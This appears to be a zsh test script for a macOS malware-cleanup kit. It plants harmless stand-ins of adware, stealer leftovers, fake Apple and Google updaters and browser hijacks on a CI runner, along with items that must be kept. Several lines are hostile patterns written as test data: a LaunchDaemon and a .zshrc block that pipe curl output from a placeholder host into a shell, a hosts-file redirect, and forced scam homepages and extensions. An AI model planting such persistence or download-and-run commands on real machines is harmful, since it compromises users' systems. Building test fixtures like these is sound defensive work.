#!/bin/zsh
# plant-mac.zsh: plants on a GitHub macOS runner what the Mac kit must remove, and things it must KEEP (a test that
# only plants bad things cannot catch a rule that removes too much). Runs as the runner user; sudo where needed.
# Test code: python3 is allowed here (the kit itself never uses it).
set -u
H=$HOME; U=$(id -un); UID_=$(id -u)
AS="$H/Library/Application Support"
mkdir -p "$H/Applications" "$H/Library/LaunchAgents" "$AS"
# Everything GitHub's own image starts by itself: all of it must still be there after the kit ran.
print -rl -- /Library/LaunchAgents/*.plist(N) /Library/LaunchDaemons/*.plist(N) "$H"/Library/LaunchAgents/*.plist(N) > /tmp/kit-baseline-plists.txt
log() { print "PLANT: $*" }
macho() { cp /usr/bin/true "$1"; codesign -s - --force "$1" 2>/dev/null; }    # an ad-hoc signed program
fakeapp() { # path name bundleid web(0/1) framework-name
  local a=$1; mkdir -p "$a/Contents/MacOS" "$a/Contents/Frameworks"
  [[ -n ${5:-} ]] && mkdir -p "$a/Contents/Frameworks/$5"
  local types=''
  [[ $4 == 1 ]] && types='<key>CFBundleURLTypes</key><array><dict><key>CFBundleURLSchemes</key><array><string>http</string><string>https</string></array></dict></array>'
  cat > "$a/Contents/Info.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict><key>CFBundleIdentifier</key><string>$3</string><key>CFBundleName</key><string>$2</string><key>CFBundleExecutable</key><string>$2</string>$types</dict></plist>
EOF
  cp /bin/sleep "$a/Contents/MacOS/$2"
  codesign -s - --force --deep "$a" 2>/dev/null
}
agent() { # file label program [args...]
  local f=$1 l=$2; shift 2
  local args=''; for a in "$@"; do args+="<string>$a</string>"; done
  cat > "$f" <<EOF
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict><key>Label</key><string>$l</string><key>ProgramArguments</key><array>$args</array><key>RunAtLoad</key><true/></dict></plist>
EOF
}

# 1. Bundled browser in her own Applications folder, running, with an updater (--wake) that starts by itself.
fakeapp "$H/Applications/Wave Browser.app" "Wave Browser" com.wavebrowser.browser 1 "Wave Framework.framework"
agent "$H/Library/LaunchAgents/com.wavebrowser.update.plist" com.wavebrowser.update "$H/Applications/Wave Browser.app/Contents/MacOS/Wave Browser" --wake
("$H/Applications/Wave Browser.app/Contents/MacOS/Wave Browser" 7200 </dev/null >/dev/null 2>&1 &) ; log "Wave Browser (running) + --wake updater"
# 2. Adload, 2021 shape: hidden numbered folder, .service agent + .system daemon, agent loaded and running.
AD="$AS/.3276169528277499560/Services/com.SwitcherGuard.service"; mkdir -p "$AD"; macho "$AD/SwitcherGuard.service"
agent "$H/Library/LaunchAgents/com.SwitcherGuard.service.plist" com.SwitcherGuard.service "$AD/SwitcherGuard.service"
sudo mkdir -p "/Library/Application Support/.3276169528277499560/System"; sudo cp "$AD/SwitcherGuard.service" "/Library/Application Support/.3276169528277499560/System/SwitcherGuard.system"
agent /tmp/sys.plist com.SwitcherGuard.system "/Library/Application Support/.3276169528277499560/System/SwitcherGuard.system"; sudo cp /tmp/sys.plist /Library/LaunchDaemons/com.SwitcherGuard.system.plist
cp /bin/sleep "$AD/SwitcherGuard.service"; codesign -s - --force "$AD/SwitcherGuard.service" 2>/dev/null
("$AD/SwitcherGuard.service" 7200 </dev/null >/dev/null 2>&1 &); log "Adload service/system pair (running)"
# 3. Adload SearchQuest shape + a crontab line that starts it, and a crontab line to KEEP.
mkdir -p "$AS/com.SearchQuest"; macho "$AS/com.SearchQuest/SearchQuest"
agent "$H/Library/LaunchAgents/com.SearchQuest.plist" com.SearchQuest "$AS/com.SearchQuest/SearchQuest"
{ print "30 */2 * * * \"$AS/com.SearchQuest/SearchQuest\""; print "0 3 * * * /usr/bin/true # KEEP family job"; } | crontab -
log "SearchQuest + crontab"
# 4. A password stealer: daemon com.finder.helper -> ~/.mainhelper, plus ~/.agent and ~/.pwd.
macho "$H/.mainhelper"; print '#!/bin/bash\nwhile true; do sleep 60; done' > "$H/.agent"; print 'hunter2' > "$H/.pwd"
agent /tmp/fh.plist com.finder.helper "$H/.mainhelper"; sudo cp /tmp/fh.plist /Library/LaunchDaemons/com.finder.helper.plist
log "stealer leftovers"
# 5. Pretends to be Apple's; 6. pretends to be Google's (GoogleUpdate.app in her folder); KEEP Google's empty placeholder.
mkdir -p "$AS/AppleUpdates"; print '#!/bin/sh\nexit 0' > "$AS/AppleUpdates/updater"; chmod +x "$AS/AppleUpdates/updater"
agent "$H/Library/LaunchAgents/com.apple.updates.agent.plist" com.apple.updates.agent /bin/sh "$AS/AppleUpdates/updater"
fakeapp "$AS/Google/GoogleUpdate.app" GoogleUpdate com.google.GoogleUpdate 0 ""
agent "$H/Library/LaunchAgents/com.google.keystone.agent.plist" com.google.keystone.agent "$AS/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate"
print '<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict/></plist>' > /tmp/empty.plist; sudo cp /tmp/empty.plist /Library/LaunchAgents/com.google.keystone.xpcservice.plist
log "Apple/Google impersonation + KEEP empty Google placeholder"
# 7. Downloads and runs code; 8. left behind by a removed program (Pulse); 9. remote control (TeamViewer).
agent /tmp/dl.plist com.system.maintenance /bin/bash -c "curl -fsSL http://example.invalid/x | bash"; sudo cp /tmp/dl.plist /Library/LaunchDaemons/com.system.maintenance.plist
agent "$H/Library/LaunchAgents/com.pulsebrowser.updater.plist" com.pulsebrowser.updater "$AS/PulseBrowser/updater" --wake
sudo mkdir -p /Applications/TeamViewer.app/Contents/MacOS; sudo cp /usr/bin/true /Applications/TeamViewer.app/Contents/MacOS/TeamViewer
agent /tmp/tv.plist com.teamviewer.teamviewer /Applications/TeamViewer.app/Contents/MacOS/TeamViewer; sudo cp /tmp/tv.plist /Library/LaunchAgents/com.teamviewer.teamviewer.plist
log "download-and-run daemon, dead Pulse updater, TeamViewer agent"
# KEEP: a home-made backup job in a dot-folder, an Electron app (not a browser), a cleaner app and an antivirus trial
# (reported, not removed), a normal Safari web app.
mkdir -p "$H/.config"; print '#!/bin/bash\nrsync -a ~/Documents /tmp/ >/dev/null' > "$H/.config/backup.sh"; chmod +x "$H/.config/backup.sh"
agent "$H/Library/LaunchAgents/com.family.backup.plist" com.family.backup /bin/bash "$H/.config/backup.sh"
fakeapp "$H/Applications/Notes Helper.app" "Notes Helper" com.example.notes 1 "Electron Framework.framework"
sudo zsh -c "$(typeset -f fakeapp); fakeapp '/Applications/MacKeeper.app' MacKeeper com.mackeeper.MacKeeper 0 ''; fakeapp '/Applications/Norton 360.app' 'Norton 360' com.norton.antivirus 0 ''"
fakeapp "$H/Applications/YouTube.app" YouTube com.apple.Safari.WebApp.1111-2222 0 ""
fakeapp "$H/Applications/Security Alert.app" "Security Alert" com.apple.Safari.WebApp.3333-4444 0 ""
log "KEEP items + scareware web app"
# 10. Shell file with a stealer's marked block (the rest of the file must stay).
print '# KEEP: my own line\nexport KEEP_ME=1\n# sysnotif-repair\ncurl -s http://example.invalid/r | sh\n# sysnotif-repair' >> "$H/.zshrc"
# 11. Hosts file line that redirects a site.
print '127.0.0.1 www.bing.com' | sudo tee -a /etc/hosts >/dev/null
# 12. Forced browser rules in preference files (KEEP Chrome's own LastRunAppBundlePath).
defaults write com.google.Chrome HomepageLocation -string "http://scam-home.example/"
defaults write com.google.Chrome DefaultSearchProviderSearchURL -string "https://searchpro.example/?q={searchTerms}"
defaults write com.google.Chrome ExtensionInstallForcelist -array "abcdefghijklmnopabcdefghijklmnop;https://searchpro.example/u.xml"
defaults write com.google.Chrome LastRunAppBundlePath -string "/Applications/Google Chrome.app"
sudo defaults write /Library/Preferences/com.google.Chrome RestoreOnStartupURLs -array "http://scam-alert.example/"
defaults write org.mozilla.firefox EnterprisePoliciesEnabled -bool true
defaults write org.mozilla.firefox Homepage__URL -string "http://scam-home.example/"
log "policies"
# 13. Safari home page (the runner has Full Disk Access).
defaults write com.apple.Safari HomePage -string "http://scam-home.example/" && log "Safari home page"
# 14. Something to back up.
mkdir -p "$H/Documents"; print "family letter" > "$H/Documents/kit-backup-test.txt"

# 15. Browser profiles: start Chrome and Edge once so they create real profiles, then plant the hijacks.
for b in "Google Chrome" "Microsoft Edge"; do
  "/Applications/$b.app/Contents/MacOS/$b" --no-first-run --no-default-browser-check --use-mock-keychain about:blank >/dev/null 2>&1 &
done
sleep 25; pkill -TERM -x "Google Chrome"; pkill -TERM -x "Microsoft Edge"; sleep 8; pkill -KILL -x "Google Chrome"; pkill -KILL -x "Microsoft Edge"; sleep 2
mkdir -p "$AS/SearchProtectExt"; print '{"name":"SearchProtect","version":"1.0","manifest_version":3,"chrome_settings_overrides":{"search_provider":{"search_url":"https://searchpro.example/?q={searchTerms}"}}}' > "$AS/SearchProtectExt/manifest.json"
mkdir -p "$AS/Google/Chrome/External Extensions"
print '{"external_update_url":"https://searchpro.example/update.xml"}' > "$AS/Google/Chrome/External Extensions/jnannpdmmiphnkpaooplhegabbghlplj.json"
print '{"external_update_url":"https://clients2.google.com/service/update2/crx"}' > "$AS/Google/Chrome/External Extensions/aapbdbdomjkkjkaonfhkkikfgjllcleb.json"
mkdir -p "$AS/Google/Chrome/Default/Sessions"; print x > "$AS/Google/Chrome/Default/Sessions/Session_13400000000000000"
python3 - "$AS" <<'PY'
import json, os, sqlite3, sys
AS = sys.argv[1]
def load(p):
    return json.load(open(p)) if os.path.exists(p) else {}
def save(p, d):
    json.dump(d, open(p, 'w'), separators=(',', ':'))
def put(d, path, v):
    for k in path[:-1]: d = d.setdefault(k, {})
    d[path[-1]] = v
for browser, ext_id, ext_name in (('Google/Chrome', 'jnannpdmmiphnkpaooplhegabbghlplj', 'SearchProtect'), ('Microsoft Edge', 'cajkghbacphcjgemgmmachjcgamkcacd', 'SearchShield')):
    prof = os.path.join(AS, browser, 'Default')
    P, S = os.path.join(prof, 'Preferences'), os.path.join(prof, 'Secure Preferences')
    p, s = load(P), load(S)
    put(s, ['extensions', 'settings', ext_id], {'location': 4, 'path': os.path.join(AS, 'SearchProtectExt'), 'manifest': {'name': ext_name, 'version': '1.0', 'chrome_settings_overrides': {'search_provider': {'search_url': 'https://searchpro.example/?q={searchTerms}'}}}})
    put(s, ['extensions', 'ui', 'developer_mode'], True)
    put(s, ['default_search_provider_data', 'template_url_data'], {'short_name': 'Search Pro', 'keyword': 'searchpro', 'url': 'https://searchpro.example/?q={searchTerms}', 'new_tab_url': 'https://searchpro.example/newtab'})
    if browser == 'Google/Chrome':
        # KEEP: a store add-on; its 0.0 must still read 0.0 afterwards (checksummed values must not change).
        put(s, ['extensions', 'settings', 'ghbmnnjooekpmoecnnnilnnbdlolhkhi'], {'location': 1, 'from_webstore': True, 'kit_float_probe': 0.0, 'manifest': {'name': 'Google Docs Offline', 'version': '1.9', 'update_url': 'https://clients2.google.com/service/update2/crx'}})
        put(s, ['session', 'startup_urls'], ['http://scam-alert.example/'])
        put(s, ['session', 'restore_on_startup'], 4)
        put(s, ['account_values', 'session', 'startup_urls'], ['http://scam-sync.example/'])
        put(s, ['homepage'], 'http://scam-home.example/')
        put(p, ['profile', 'content_settings', 'exceptions', 'notifications'], {'https://news-alerts.example:443,*': {'setting': 1}, 'https://mail.google.com:443,*': {'setting': 1}})
        put(p, ['account_values', 'profile', 'content_settings', 'exceptions', 'notifications'], {'https://win-prize.example:443,*': {'setting': 1}})
        put(p, ['profile', 'exit_type'], 'Crashed')
        db = sqlite3.connect(os.path.join(prof, 'Web Data'))
        cols = [r for r in db.execute('PRAGMA table_info(keywords)')]
        def row(name, kw, url, guid):
            vals = {c[1]: (0 if c[2].upper().startswith(('INT', 'BOOL')) else '') for c in cols if c[3] and c[1] != 'id'}
            vals.update({'short_name': name, 'keyword': kw, 'url': url, 'sync_guid': guid, 'prepopulate_id': 0})
            db.execute('INSERT INTO keywords (%s) VALUES (%s)' % (','.join(vals), ','.join('?' * len(vals))), list(vals.values()))
        row('Search Pro', 'searchpro2', 'https://searchpro.example/s?q={searchTerms}', 'kit-test-guid-searchpro')
        row('Wikipedia', 'wiki', 'https://en.wikipedia.org/w/index.php?search={searchTerms}', 'kit-test-guid-wiki')
        db.commit(); db.close()
        put(s, ['default_search_provider', 'guid'], 'kit-test-guid-searchpro')
    save(P, p); save(S, s)
    print('PLANT: %s profile hijacked' % browser)
PY
# 16. Firefox: a profile with a forced user.js, notification permissions (one to KEEP) and an add-on another program put there.
/Applications/Firefox.app/Contents/MacOS/firefox -CreateProfile kittest >/dev/null 2>&1
FP=$(print -l "$AS/Firefox/Profiles"/*kittest(N/) | head -1)
if [[ -n $FP ]]; then
  print 'user_pref("browser.startup.homepage", "http://scam-home.example/");' > "$FP/user.js"
  sqlite3 "$FP/permissions.sqlite" "CREATE TABLE IF NOT EXISTS moz_perms (id INTEGER PRIMARY KEY, origin TEXT, type TEXT, permission INTEGER, expireType INTEGER, expireTime INTEGER, modificationTime INTEGER); INSERT INTO moz_perms (origin,type,permission,expireType,expireTime,modificationTime) VALUES ('https://win-prize.example','desktop-notification',1,0,0,0),('https://mail.google.com','desktop-notification',1,0,0,0);"
  print '{"schemaVersion":36,"addons":[{"id":"helper@searchpro.example","location":"app-profile","active":true,"foreignInstall":true,"signedState":2,"defaultLocale":{"name":"Search Helper"}}]}' > "$FP/extensions.json"
  log "Firefox profile $FP"
fi
print "PLANT: done"
